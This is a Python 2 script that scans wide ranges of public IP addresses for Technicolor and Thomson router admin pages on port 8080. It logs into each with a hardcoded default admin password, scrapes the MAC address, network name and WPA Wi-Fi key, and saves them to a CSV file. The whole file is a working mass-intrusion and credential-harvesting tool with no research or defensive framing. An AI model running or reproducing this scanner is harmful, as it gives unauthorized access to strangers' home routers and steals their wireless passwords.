# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import socket

tech = 0
tom = 0
#181.52.82.215 181.54.153.14
router = open('db.csv','a+')
for i in range(180,255):
    i = i + 1
    c = str(i)
    for j in range(50,255):
        j = j + 1
        l=str(j)
        for p in range(0,255):
            p = p + 1
            m = str(p)
            for a in range(0,255):
                a = a + 1
                g = str(a)
                h = c + "." + l + "." + m + "." + g
                try:
                    #print 'probando...........................'+h
                    r1 = requests.get('http://'+str(h)+':8080/', timeout=0.5)
                    head = r1.headers
                    b = 'WWW-Authenticate' in head
                    if b==True:
                        thom = 'Basic realm="Thomson"'
                        techni = 'Basic realm="Technicolor"'
                        
                        r = requests.get('http://'+h+':8080/', timeout=0.5)
                        n = r.headers['WWW-Authenticate']
                        if n == techni: ##Technicolor
                            tech = tech+1
                            r2 = requests.get('http://'+h+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.5)
                            guess = requests.get('http://'+h+':8080/wlanGuestNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.5)
                            guess_ok = str(guess.status_code)
                            #:8080/wlanGuestNetwork.asp
                            parser1 = r2.content
                            #name="ServiceSetIdentifier"
                            bs1 = BeautifulSoup(parser1, "html.parser")
                            #red invitado######################################################################################################################
                            """if guess_ok=="200":
                                print h + ' Guess ok'
                                bs = BeautifulSoup(guess.content, "html.parser")
                                for name in bs.find_all("select", {"name":"CurrentNetworks"}):
                                    t = name.text[16:]
                                    ma = t[-19:]
                                    mac = ma[1:-1]
                                    ssid = t[0:-19]
                                    """
                                    #print h+'...................'+str(mac)+'...................'+str(ssid)+'.....................guess enable'
                                    
                            ###################################################################################################################################
                            
                            #for name in bs1.find_all("input", {"name":"ServiceSetIdentifier"}):
                            for name in bs1.find_all("td", align="middle"):
                                t = name.text[16:]
                                ma = t[-19:]
                                mac = ma[1:-1]
                                ssid = t[0:-19]
                                
                                for pwd in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                    
                                        
                                    router.write(h+','+'Technicolor'+','+str(mac)+','+str(ssid)+','+str(pwd["value"])+','+'\n')
                                    print h+".....Technicolor..........."+str(mac)+'.......'+str(ssid)+"....."+pwd["value"]
                                    
                                    
                                    
                        elif n==thom: ##Thomson
                            tom = tom+1
                            r3 = requests.get('http://' + h + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.5)
                            r4 = requests.get('http://' + h + ':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.5)
                            parser = r4.content
                            bs1 = BeautifulSoup(parser, "html.parser")
                            
                            
                            for name in bs1.find_all("td", align="middle"):
                                t = name.text[16:]
                                ma = t[-19:]
                                mac = ma[1:-1]
                                ssid = t[0:-19]
                                for pws in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
                                    router.write(h+','+'Thomson'+','+str(mac)+','+str(ssid)+','+str(pws["value"])+','+'\n')
                                    print h+".....Thomson..............."+str(mac)+'.......'+str(ssid)+"....."+pws["value"]
                        
                                    
                except requests.exceptions.Timeout:
                    pass
                except KeyError:
                    pass
                except socket.timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
                #except requests.exceptions.ReadTimeout:
                    #pass
                #except requests.exceptions.ConnectionError:
                    #pass
                #except requests.exceptions.ConnectTimeout:
                   # pass
router.close()
print str(tech)+" technicolor"
print str(tom)+" tomson"
print str(tech+tom)+" En total"

    
